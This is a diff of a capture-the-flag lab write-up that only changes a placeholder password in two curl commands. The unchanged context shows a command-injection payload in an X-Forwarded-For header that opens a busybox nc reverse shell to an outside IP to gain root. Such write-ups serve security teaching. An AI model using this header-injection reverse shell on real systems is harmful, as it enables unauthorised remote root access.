@@ -309,7 +309,7 @@ Now, we can make curl request internally to port 8080 with custom headers and ch
 kitty@ip-10-10-50-107:/var/www/development$ curl -X POST \
 > -H "Content-Type: application/x-www-form-urlencoded" \
 > -H "X-Forwarded-For: test" \
-> -d "username=0xi&password=asdasd" \
+> -d "username=0xi&password=pass" \
 > http://127.0.0.1:8080/index.php
 
 SQL Injection detected. This incident will be logged!
@@ -323,7 +323,7 @@ Now, we can put reverse shell there in header and will get root shell back to ou
 
 ```bash
 kitty@ip-10-10-50-107:/var/www/development$ curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "X-Forwarded-For: \$(busybox nc 10.17.87.131 4445 -e /bin/bash)" \
-> -d "username=0xi&password=asdasd" \
+> -d "username=0xi&password=pass" \
 > http://127.0.0.1:8080/index.php
 
 SQL Injection detected. This incident will be logged!kitty@ip-10-10-50-107:/var/www/development$ cat logged
